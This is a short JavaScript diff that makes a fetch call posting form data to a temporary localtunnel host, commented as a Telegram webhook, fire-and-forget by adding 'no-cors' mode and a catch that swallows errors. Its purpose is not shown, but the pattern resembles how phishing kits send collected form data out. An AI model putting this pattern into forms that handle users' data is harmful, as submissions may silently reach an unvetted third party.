@@ -266,8 +266,12 @@
                     // 2. Webhook listener (post to Telegram)
                     fetch('https://salty-chicken-help.loca.lt', {
                         method: 'POST',
+                        mode: 'no-cors',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify(formData)
+                    }).catch(err => {
+                        console.warn('Webhook call issue:', err);
+                        return null;
                     })
                 ];
                 
